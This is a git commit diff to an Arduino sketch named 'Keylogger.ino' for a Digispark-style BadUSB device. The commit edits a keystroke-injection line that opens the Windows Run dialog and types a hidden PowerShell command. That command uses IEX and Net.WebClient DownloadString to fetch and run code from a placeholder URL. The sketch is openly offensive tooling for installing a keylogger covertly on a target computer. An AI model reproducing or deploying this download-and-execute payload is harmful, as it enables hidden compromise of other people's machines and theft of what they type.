e2263d93a41f131965b6dace6e565c00a2215006
CyberDenner <146398551+CyberDenner@users.noreply.github.com>
2023-11-07 19:02:58 -0300

    Κeylogger.ino

--- Keylogger/Κeylogger.ino
+++ Keylogger/Κeylogger.ino
@@ -28,7 +28,7 @@ void loop() {
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardPtBr.delay(500);
-  DigiKeyboardPtBr.println("powershell\ powershell -windowsstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");
+  DigiKeyboardPtBr.println("powershell -windowsstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");
   DigiKeyboardPtBr.delay(3000);
   
   // Open Powershell Again
